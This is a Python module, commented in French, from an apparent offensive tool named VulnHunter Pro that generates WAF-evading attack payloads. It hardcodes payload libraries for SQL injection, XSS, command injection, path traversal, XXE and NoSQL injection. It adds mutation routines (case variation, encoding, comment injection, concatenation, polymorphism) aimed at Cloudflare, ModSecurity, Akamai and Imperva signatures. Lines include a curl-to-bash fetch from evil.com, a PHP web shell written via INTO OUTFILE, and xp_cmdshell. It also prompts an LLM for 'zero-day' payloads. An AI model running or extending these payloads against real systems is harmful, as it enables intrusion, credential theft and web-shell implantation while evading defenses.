"""
Générateur de payloads IA avancé pour VulnHunter Pro
Payloads bypass WAF, context-aware, polymorphic, zero-day discovery
"""

import asyncio
import re
import json
import hashlib
import random
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime
from urllib.parse import quote, unquote
import base64
import binascii
from loguru import logger

from integration_ia.openai_client import ClientOpenAI


class GenerateurPayloadsIA:
    """
    Générateur avancé de payloads utilisant l'IA pour bypass WAF et attaques contextuelles
    """

    def __init__(self, client_ia: Optional[ClientOpenAI] = None):
        self.client_ia = client_ia
        self.cache_payloads = {}
        self.cache_timeout = 1800  # 30 minutes

        # Patterns WAF connus
        self.patterns_waf = self._charger_patterns_waf()

        # Payloads de base par vulnérabilité
        self.payloads_base = self._charger_payloads_base()

        # Techniques de bypass par WAF
        self.techniques_bypass = self._charger_techniques_bypass()

        # Adaptations contextuelles par techno
        self.adaptations_context = self._charger_adaptations_context()

        logger.info("🎯 Générateur de payloads IA avancé initialisé")

    def _charger_patterns_waf(self) -> Dict[str, Dict]:
        """Charge les patterns de détection des WAF connus"""
        return {
            'cloudflare': {
                'signatures': [
                    r'union.*select.*from',
                    r'<script[^>]*>.*?</script>',
                    r'\bUNION\b.*\bSELECT\b',
                    r'\bOR\b.*\d+.*=.*\d+',
                    r'script\s*=',
                    r'on\w+\s*=',
                ],
                'bypass_techniques': [
                    'case_variation', 'encoding', 'comments_injection',
                    'spaces_replacement', 'concatenation', 'hex_encoding'
                ],
                'false_positives': [
                    'normal_content', 'legitimate_queries', 'internal_paths'
                ]
            },
            'modsecurity': {
                'signatures': [
                    r'union.*select',
                    r'information_schema',
                    r'load_file',
                    r'into.*outfile',
                    r'benchmark.*\d+',
                    r'sleep\(\d+\)',
                ],
                'bypass_techniques': [
                    'keyword_replacement', 'function_aliasing', 'inline_comments',
                    'whitespace_manipulation', 'encoding_layers', 'time_delays'
                ],
                'false_positives': [
                    'legitimate_sql', 'normal_forms', 'api_calls'
                ]
            },
            'akamai': {
                'signatures': [
                    r'<script.*?>',
                    r'javascript:',
                    r'vbscript:',
                    r'on\w+\s*=.*[<>]',
                    r'union.*select.*from',
                    r'or.*1.*=.*1',
                ],
                'bypass_techniques': [
                    'event_handler_obfuscation', 'protocol_smuggling',
                    'context_manipulation', 'encoding_variations'
                ],
                'false_positives': [
                    'html_content', 'js_frameworks', 'legitimate_forms'
                ]
            },
            'imperva': {
                'signatures': [
                    r'union.*select',
                    r'information_schema',
                    r'../../../../',
                    r'%2e%2e%2f',
                    r'<script[^>]*src\s*=',
                    r'eval\s*\(',
                ],
                'bypass_techniques': [
                    'path_obfuscation', 'function_replacement',
                    'attribute_manipulation', 'encoding_combinations'
                ],
                'false_positives': [
                    'static_files', 'framework_assets', 'api_responses'
                ]
            }
        }

    def _charger_payloads_base(self) -> Dict[str, Dict]:
        """Charge les payloads de base par type de vulnérabilité"""
        return {
            'sql_injection': {
                'union_based': [
                    "UNION SELECT 1,2,3--",
                    "UNION ALL SELECT NULL,NULL,NULL--",
                    "UNION SELECT database(),user(),version()--"
                ],
                'error_based': [
                    "' AND 1=convert(int,(select top 1 name from sysobjects where xtype='U'))--",
                    "' AND 1=1; PRINT @@version--",
                    "1' AND extractvalue(1,concat(0x7e,(select @@version),0x7e))--"
                ],
                'blind': [
                    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                    "1' AND ASCII(SUBSTRING((SELECT @@version),1,1)) > 64--",
                    "1' AND IF(1=1, SLEEP(5), 0)--"
                ]
            },
            'xss': {
                'reflected': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                'stored': [
                    "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
                ],
                'dom_based': [
                    "#<script>alert('XSS')</script>",
                    "?param=<script>alert('XSS')</script>",
                    "';alert('XSS');//"
                ]
            },
            'command_injection': {
                'basic': [
                    "; ls -la",
                    "| cat /etc/passwd",
                    "`whoami`"
                ],
                'encoded': [
                    "$(`echo 'cat /etc/passwd'`)",
                    ";`echo 'ls -la'`",
                    "|base64 -d<<<Y2F0IC9ldGMvcGFzc3dk"  # base64 encoded
                ],
                'time_based': [
                    "; sleep 10",
                    "| ping -c 10 127.0.0.1",
                    "; timeout 10 bash -c 'sleep 5'"
                ]
            },
            'path_traversal': {
                'basic': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/passwd"
                ],
                'encoded': [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "..././..././..././etc/passwd"
                ],
                'null_bytes': [
                    "../../../etc/passwd%00.jpg",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.png"
                ]
            }
        }

    def _charger_techniques_bypass(self) -> Dict[str, Dict]:
        """Charge les techniques de bypass par WAF"""
        return {
            'case_variation': {
                'description': 'Variation de casse pour contourner les signatures',
                'examples': {
                    'UNION': ['Union', 'union', 'UnIoN', 'UNiON'],
                    'SELECT': ['Select', 'select', 'SeLeCt', 'SELect'],
                    'SCRIPT': ['Script', 'script', 'ScRiPt', 'SCRipt']
                }
            },
            'encoding': {
                'description': 'Encodage pour masquer les payloads',
                'types': ['url', 'html', 'base64', 'hex', 'unicode']
            },
            'comments_injection': {
                'description': 'Injection de commentaires pour casser les signatures',
                'patterns': [
                    'UN/**/ION SEL/**/ECT',
                    'UNI/*comment*/ON SELECT',
                    'UN/*bypass*/ION SELECT'
                ]
            },
            'spaces_replacement': {
                'description': 'Remplacement des espaces par des caractères alternatifs',
                'replacements': {
                    ' ': ['%20', '%09', '%0a', '%0d', '+', '/**/', '/*bypass*/']
                }
            },
            'concatenation': {
                'description': 'Utilisation de concaténation pour assembler les payloads',
                'patterns': [
                    "CONCAT('UNI','ON SEL','ECT')",
                    "'UNI'||'ON SEL'||'ECT'",
                    "CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)"  # UNION in ASCII
                ]
            },
            'keyword_replacement': {
                'description': 'Remplacement de mots-clés par équivalents',
                'mappings': {
                    'UNION': ['UNION ALL', 'UNION DISTINCT'],
                    'SELECT': ['SELECT ALL', 'SELECT DISTINCT'],
                    'INFORMATION_SCHEMA': ['information_schema', 'INFORMATION_SCHEMA'],
                    'SCRIPT': ['SCRIPT', 'script', 'ScRiPt']
                }
            },
            'function_aliasing': {
                'description': 'Utilisation d\'alias de fonctions',
                'examples': [
                    "SUBSTR() instead of SUBSTRING()",
                    "CHAR() instead of CHR()",
                    "CONCAT_WS() instead of CONCAT()"
                ]
            }
        }

    def _charger_adaptations_context(self) -> Dict[str, Dict]:
        """Charge les adaptations contextuelles par technologie"""
        return {
            'php': {
                'sql_injection': {
                    'functions': ['mysql_query', 'mysqli_query', 'PDO::query'],
                    'specific_payloads': [
                        "1' UNION SELECT table_name FROM information_schema.tables--",
                        "1' AND 1=0 UNION SELECT version()--",
                        "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php'--"
                    ]
                },
                'xss': {
                    'filters': ['htmlspecialchars', 'htmlentities'],
                    'bypass': [
                        "<img src=x onerror=\"alert('XSS')\">",
                        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                        "<svg onload=alert('XSS')>"
                    ]
                },
                'file_inclusion': {
                    'functions': ['include', 'require', 'include_once', 'require_once'],
                    'payloads': [
                        "php://filter/convert.base64-encode/resource=index.php",
                        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",  # <?php system($_GET['cmd']); ?>
                        "expect://whoami"
                    ]
                }
            },
            'asp_net': {
                'sql_injection': {
                    'functions': ['SqlCommand', 'ExecuteReader'],
                    'specific_payloads': [
                        "1' UNION SELECT name FROM sys.databases--",
                        "1'; EXEC xp_cmdshell 'whoami'--",
                        "1' AND 1=0 UNION SELECT @@version--"
                    ]
                },
                'xss': {
                    'filters': ['AntiXssEncoder', 'HttpUtility.HtmlEncode'],
                    'bypass': [
                        "<img src=\"x\" onerror=\"alert('XSS')\" />",
                        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                        "<svg onload=alert('XSS')></svg>"
                    ]
                }
            },
            'nodejs': {
                'nosql_injection': {
                    'functions': ['find', 'findOne', 'aggregate'],
                    'payloads': [
                        '{"$ne": null}',
                        '{"$where": "this.password.length > 0"}',
                        '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}'
                    ]
                },
                'command_injection': {
                    'functions': ['exec', 'spawn', 'execSync'],
                    'payloads': [
                        "; cat /etc/passwd",
                        "| curl http://evil.com/shell.sh | bash",
                        "`whoami`"
                    ]
                }
            },
            'java': {
                'sql_injection': {
                    'functions': ['Statement.executeQuery', 'PreparedStatement'],
                    'specific_payloads': [
                        "1' UNION SELECT table_name FROM information_schema.tables--",
                        "1' AND 1=0 UNION SELECT @@version--"
                    ]
                },
                'xxe': {
                    'vulnerable_parsers': ['DocumentBuilder', 'SAXParser'],
                    'payloads': [
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><foo>&xxe;</foo>'
                    ]
                }
            }
        }

    async def generer_payloads_avances(
        self,
        type_vulnerabilite: str,
        contexte: Dict[str, Any],
        nombre_payloads: int = 10
    ) -> List[Dict[str, Any]]:
        """
        Génère des payloads avancés avec IA pour bypass WAF et adaptation contextuelle

        Args:
            type_vulnerabilite: Type de vulnérabilité (sql_injection, xss, etc.)
            contexte: Contexte d'attaque (techno, WAF détecté, etc.)
            nombre_payloads: Nombre de payloads à générer

        Returns:
            Liste de payloads avancés avec métadonnées
        """
        try:
            # Vérifier le cache
            cache_key = hashlib.md5(
                f"{type_vulnerabilite}:{json.dumps(contexte, sort_keys=True)}:{nombre_payloads}".encode()
            ).hexdigest()

            if cache_key in self.cache_payloads:
                cache_time, result = self.cache_payloads[cache_key]
                if (datetime.now().timestamp() - cache_time) < self.cache_timeout:
                    return result

            logger.info(f"🎯 Génération de {nombre_payloads} payloads IA pour {type_vulnerabilite}")

            payloads_avances = []

            # 1. Générer payloads de base adaptés au contexte
            payloads_base = self._generer_payloads_base_contextuels(type_vulnerabilite, contexte)

            # 2. Appliquer techniques de bypass WAF
            waf_detecte = contexte.get('waf', 'unknown')
            payloads_bypass = await self._appliquer_bypass_waf(payloads_base, waf_detecte)

            # 3. Générer payloads polymorphes
            payloads_polymorphes = self._generer_payloads_polymorphes(payloads_bypass, nombre_payloads)

            # 4. Générer avec IA pour zero-day discovery
            if self.client_ia and self.client_ia.disponible:
                payloads_ia = await self._generer_payloads_ia_zero_day(
                    type_vulnerabilite, contexte, nombre_payloads // 3
                )
                payloads_polymorphes.extend(payloads_ia)

            # 5. Valider et scorer les payloads
            for payload in payloads_polymorphes[:nombre_payloads]:
                payload_info = {
                    'payload': payload,
                    'type': type_vulnerabilite,
                    'techniques_bypass': self._identifier_techniques_bypass(payload),
                    'score_confiance': self._calculer_score_payload(payload, contexte),
                    'contexte_adaptation': contexte.get('technology', 'unknown'),
                    'waf_cible': waf_detecte,
                    'polymorphic_variations': self._generer_variations_polymorphes(payload, 3),
                    'timestamp_generation': datetime.now().isoformat()
                }
                payloads_avances.append(payload_info)

            # Trier par score de confiance
            payloads_avances.sort(key=lambda x: x['score_confiance'], reverse=True)

            # Mettre en cache
            self.cache_payloads[cache_key] = (datetime.now().timestamp(), payloads_avances)

            logger.success(f"✅ {len(payloads_avances)} payloads avancés générés pour {type_vulnerabilite}")
            return payloads_avances

        except Exception as e:
            logger.error(f"Erreur génération payloads IA: {str(e)}")
            return []

    def _generer_payloads_base_contextuels(self, type_vuln: str, contexte: Dict) -> List[str]:
        """Génère des payloads de base adaptés au contexte technologique"""
        payloads = []

        # Récupérer les payloads de base
        if type_vuln in self.payloads_base:
            for categorie, payload_list in self.payloads_base[type_vuln].items():
                payloads.extend(payload_list)

        # Adapter selon la technologie détectée
        techno = contexte.get('technology', '').lower()
        if techno in self.adaptations_context:
            techno_adapt = self.adaptations_context[techno]
            if type_vuln in techno_adapt:
                specific_payloads = techno_adapt[type_vuln].get('specific_payloads', [])
                payloads.extend(specific_payloads)

        return list(set(payloads))  # Éliminer les doublons

    async def _appliquer_bypass_waf(self, payloads: List[str], waf_type: str) -> List[str]:
        """Applique des techniques de bypass selon le WAF détecté"""
        if waf_type not in self.patterns_waf:
            return payloads

        waf_info = self.patterns_waf[waf_type]
        techniques = waf_info['bypass_techniques']

        payloads_bypass = []

        for payload in payloads:
            # Appliquer chaque technique de bypass
            for technique in techniques:
                if technique in self.techniques_bypass:
                    variations = self._appliquer_technique_bypass(payload, technique)
                    payloads_bypass.extend(variations)

        # Éliminer les doublons et garder les originaux
        return list(set(payloads + payloads_bypass))

    def _appliquer_technique_bypass(self, payload: str, technique: str) -> List[str]:
        """Applique une technique de bypass spécifique"""
        variations = [payload]  # Garder l'original

        tech_info = self.techniques_bypass[technique]

        if technique == 'case_variation':
            # Variation de casse pour mots-clés SQL/XSS
            variations.extend(self._appliquer_case_variation(payload))

        elif technique == 'encoding':
            # Encodage multiple couches
            variations.extend(self._appliquer_encodage(payload))

        elif technique == 'comments_injection':
            # Injection de commentaires
            variations.extend(self._appliquer_comments_injection(payload))

        elif technique == 'spaces_replacement':
            # Remplacement des espaces
            variations.extend(self._appliquer_spaces_replacement(payload))

        elif technique == 'concatenation':
            # Utilisation de concaténation
            variations.extend(self._appliquer_concatenation(payload))

        elif technique == 'keyword_replacement':
            # Remplacement de mots-clés
            variations.extend(self._appliquer_keyword_replacement(payload))

        return variations

    def _appliquer_case_variation(self, payload: str) -> List[str]:
        """Applique des variations de casse"""
        variations = []

        # Patterns SQL courants
        sql_patterns = {
            r'\bUNION\b': ['Union', 'union', 'UnIoN', 'UNiON'],
            r'\bSELECT\b': ['Select', 'select', 'SeLeCt', 'SELect'],
            r'\bFROM\b': ['From', 'from', 'FrOm', 'FROm'],
            r'\bWHERE\b': ['Where', 'where', 'WhErE', 'WHERe']
        }

        for pattern, replacements in sql_patterns.items():
            for replacement in replacements:
                variation = re.sub(pattern, replacement, payload, flags=re.IGNORECASE)
                if variation != payload:
                    variations.append(variation)

        # Patterns XSS
        xss_patterns = {
            r'\bSCRIPT\b': ['Script', 'script', 'ScRiPt', 'SCRipt'],
            r'\bALERT\b': ['Alert', 'alert', 'AlErT', 'ALERt']
        }

        for pattern, replacements in xss_patterns.items():
            for replacement in replacements:
                variation = re.sub(pattern, replacement, payload, flags=re.IGNORECASE)
                if variation != payload:
                    variations.append(variation)

        return variations

    def _appliquer_encodage(self, payload: str) -> List[str]:
        """Applique différents types d'encodage"""
        variations = []

        # URL encoding
        variations.append(quote(payload))

        # Double URL encoding
        variations.append(quote(quote(payload)))

        # HTML encoding
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
        variations.append(html_encoded)

        # Base64 encoding (pour certains contextes)
        try:
            b64_encoded = base64.b64encode(payload.encode()).decode()
            variations.append(b64_encoded)
        except:
            pass

        # Hex encoding
        hex_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        variations.append(hex_encoded)

        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        variations.append(unicode_encoded)

        return variations

    def _appliquer_comments_injection(self, payload: str) -> List[str]:
        """Injecte des commentaires pour casser les signatures"""
        variations = []

        # Pour SQL
        if 'UNION' in payload.upper() and 'SELECT' in payload.upper():
            # Injecter des commentaires entre les mots-clés
            variations.append(payload.replace('UNION SELECT', 'UN/**/ION SEL/**/ECT'))
            variations.append(payload.replace('UNI/*comment*/ON SELECT', 'UNI/*comment*/ON SELECT'))
            variations.append(payload.replace('UNION SELECT', 'UN/*bypass*/ION SELECT'))

        # Pour XSS
        if '<script>' in payload.lower():
            variations.append(payload.replace('<script>', '<!--><script>'))
            variations.append(payload.replace('<script>', '<script><!--'))

        return variations

    def _appliquer_spaces_replacement(self, payload: str) -> List[str]:
        """Remplace les espaces par des caractères alternatifs"""
        variations = []

        replacements = ['/**/', '/*bypass*/', '%20', '%09', '%0a', '+']

        for replacement in replacements:
            variation = payload.replace(' ', replacement)
            variations.append(variation)

        return variations

    def _appliquer_concatenation(self, payload: str) -> List[str]:
        """Utilise la concaténation pour assembler les payloads"""
        variations = []

        # Pour SQL
        if 'UNION SELECT' in payload.upper():
            variations.append(payload.replace('UNION SELECT', "CONCAT('UNI','ON SEL','ECT')"))
            variations.append(payload.replace('UNION SELECT', "'UNI'||'ON SEL'||'ECT'"))

        # Pour XSS avec concaténation JavaScript
        if 'alert(' in payload.lower():
            variations.append(payload.replace("alert('XSS')", "'aler'+'t'+'('+'\\'XSS\\''+')'"))

        return variations

    def _appliquer_keyword_replacement(self, payload: str) -> List[str]:
        """Remplace les mots-clés par des équivalents"""
        variations = []

        replacements = {
            'UNION': ['UNION ALL', 'UNION DISTINCT'],
            'SELECT': ['SELECT ALL', 'SELECT DISTINCT'],
            'INFORMATION_SCHEMA': ['information_schema', '`information_schema`'],
            'SCRIPT': ['SCRIPT', 'script', 'ScRiPt']
        }

        for original, alternatives in replacements.items():
            for alternative in alternatives:
                variation = payload.replace(original, alternative)
                if variation != payload:
                    variations.append(variation)

        return variations

    def _generer_payloads_polymorphes(self, payloads_base: List[str], nombre: int) -> List[str]:
        """Génère des payloads polymorphes qui changent automatiquement"""
        payloads_polymorphes = []

        for payload in payloads_base:
            # Générer des variations du payload
            variations = self._generer_variations_polymorphes(payload, max(1, nombre // len(payloads_base)))
            payloads_polymorphes.extend(variations)

        # Mélanger et limiter
        random.shuffle(payloads_polymorphes)
        return payloads_polymorphes[:nombre]

    def _generer_variations_polymorphes(self, payload: str, nombre_variations: int) -> List[str]:
        """Génère des variations polymorphes d'un payload"""
        variations = [payload]  # Garder l'original

        # Appliquer des transformations aléatoires
        for _ in range(nombre_variations - 1):
            variation = payload

            # Transformation 1: Changer la casse aléatoirement
            if random.random() < 0.3:
                variation = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in variation)

            # Transformation 2: Ajouter des espaces ou commentaires
            if random.random() < 0.4:
                if 'UNION' in variation.upper():
                    variation = variation.replace('UNION', 'UN/**/ION')
                if 'SELECT' in variation.upper():
                    variation = variation.replace('SELECT', 'SEL/**/ECT')

            # Transformation 3: Encoder partiellement
            if random.random() < 0.3:
                # Encoder quelques caractères
                chars_to_encode = random.sample(list(variation), min(3, len(variation)))
                for char in chars_to_encode:
                    if char not in [' ', '<', '>', '"', "'"]:
                        variation = variation.replace(char, f'%{ord(char):02x}', 1)

            # Transformation 4: Ajouter du bruit
            if random.random() < 0.2:
                noise = random.choice(['/**/', '/*x*/', '%20', '+'])
                if ' ' in variation:
                    variation = variation.replace(' ', noise, 1)

            variations.append(variation)

        return list(set(variations))  # Éliminer les doublons

    async def _generer_payloads_ia_zero_day(
        self,
        type_vuln: str,
        contexte: Dict,
        nombre: int
    ) -> List[str]:
        """Génère des payloads avec IA pour découverte de zero-day"""
        if not self.client_ia or not self.client_ia.disponible:
            return []

        try:
            techno = contexte.get('technology', 'web')
            waf = contexte.get('waf', 'unknown')

            prompt = f"""
            Génère {nombre} payloads avancés pour {type_vuln} qui pourraient être des zero-day.

            Contexte:
            - Technologie: {techno}
            - WAF détecté: {waf}
            - Type de vulnérabilité: {type_vuln}

            Les payloads doivent:
            1. Contourner les WAF courants ({waf})
            2. Exploiter des vulnérabilités potentielles non patchées
            3. Utiliser des techniques avancées (encoding, obfuscation, etc.)
            4. Être adaptés au contexte technologique {techno}

            Fournis exactement {nombre} payloads, un par ligne, sans explications supplémentaires.
            """

            response = await self.client_ia.generer_completion(prompt, temperature=0.8)

            if response:
                # Parser la réponse (une payload par ligne)
                payloads = [line.strip() for line in response.split('\n') if line.strip()]
                return payloads[:nombre]

        except Exception as e:
            logger.debug(f"Erreur génération IA zero-day: {str(e)}")

        return []

    def _identifier_techniques_bypass(self, payload: str) -> List[str]:
        """Identifie les techniques de bypass utilisées dans un payload"""
        techniques = []

        # Vérifier chaque technique
        if re.search(r'/\*\*/|/\*.*?\*/', payload):
            techniques.append('comments_injection')

        if '%' in payload and any(c in payload for c in '0123456789abcdefABCDEF'):
            techniques.append('encoding')

        if '/**/' in payload or '/*bypass*/' in payload:
            techniques.append('spaces_replacement')

        if 'CONCAT(' in payload.upper() or '||' in payload:
            techniques.append('concatenation')

        if re.search(r'[a-z][A-Z]|[A-Z][a-z]', payload) and payload != payload.lower() and payload != payload.upper():
            techniques.append('case_variation')

        return techniques

    def _calculer_score_payload(self, payload: str, contexte: Dict) -> float:
        """Calcule le score de confiance d'un payload"""
        score = 0.5  # Score de base

        # Bonus pour techniques de bypass
        techniques = self._identifier_techniques_bypass(payload)
        score += len(techniques) * 0.1

        # Bonus pour adaptation contextuelle
        techno = contexte.get('technology', '').lower()
        if techno in self.adaptations_context:
            score += 0.2

        # Bonus pour longueur appropriée
        if 10 <= len(payload) <= 200:
            score += 0.1

        # Pénalité pour payloads trop évidents
        if payload in self._get_payloads_evidents():
            score -= 0.2

        return max(0.0, min(1.0, score))

    def _get_payloads_evidents(self) -> List[str]:
        """Retourne les payloads trop évidents à éviter"""
        return [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "; ls -la"
        ]

    async def tester_payload_waf_bypass(
        self,
        payload: str,
        url_test: str,
        waf_type: str = 'unknown'
    ) -> Dict[str, Any]:
        """
        Teste si un payload peut bypass un WAF spécifique

        Args:
            payload: Payload à tester
            url_test: URL de test
            waf_type: Type de WAF

        Returns:
            Résultat du test avec score de bypass
        """
        try:
            # Simuler un test (en production, ferait une vraie requête)
            score_bypass = 0.0
            blocked = False

            # Analyser le payload contre les signatures WAF
            if waf_type in self.patterns_waf:
                signatures = self.patterns_waf[waf_type]['signatures']
                for signature in signatures:
                    if re.search(signature, payload, re.IGNORECASE):
                        blocked = True
                        break

            # Si pas bloqué par signatures classiques, bonus
            if not blocked:
                score_bypass = 0.8
                # Bonus pour techniques avancées
                if len(self._identifier_techniques_bypass(payload)) > 0:
                    score_bypass = 0.95

            return {
                'payload': payload,
                'waf_type': waf_type,
                'blocked': blocked,
                'bypass_score': score_bypass,
                'techniques_used': self._identifier_techniques_bypass(payload)
            }

        except Exception as e:
            logger.debug(f"Erreur test bypass WAF: {str(e)}")
            return {
                'payload': payload,
                'waf_type': waf_type,
                'blocked': True,
                'bypass_score': 0.0,
                'error': str(e)
            }

    def generer_rapport_payloads(self, payloads: List[Dict]) -> Dict[str, Any]:
        """
        Génère un rapport détaillé sur les payloads générés

        Args:
            payloads: Liste des payloads générés

        Returns:
            Rapport détaillé
        """
        rapport = {
            'total_payloads': len(payloads),
            'moyenne_confiance': 0.0,
            'techniques_bypass_utilisees': {},
            'distribution_types': {},
            'top_payloads': [],
            'recommandations': []
        }

        if not payloads:
            return rapport

        # Calculer la moyenne de confiance
        rapport['moyenne_confiance'] = sum(p['score_confiance'] for p in payloads) / len(payloads)

        # Compter les techniques de bypass
        for payload in payloads:
            for technique in payload.get('techniques_bypass', []):
                rapport['techniques_bypass_utilisees'][technique] = \
                    rapport['techniques_bypass_utilisees'].get(technique, 0) + 1

        # Top 5 payloads
        rapport['top_payloads'] = sorted(payloads, key=lambda x: x['score_confiance'], reverse=True)[:5]

        # Générer recommandations
        if rapport['moyenne_confiance'] < 0.6:
            rapport['recommandations'].append("Considérer l'utilisation de l'IA pour améliorer les payloads")
        if len(rapport['techniques_bypass_utilisees']) < 3:
            rapport['recommandations'].append("Diversifier les techniques de bypass WAF")

        return rapport
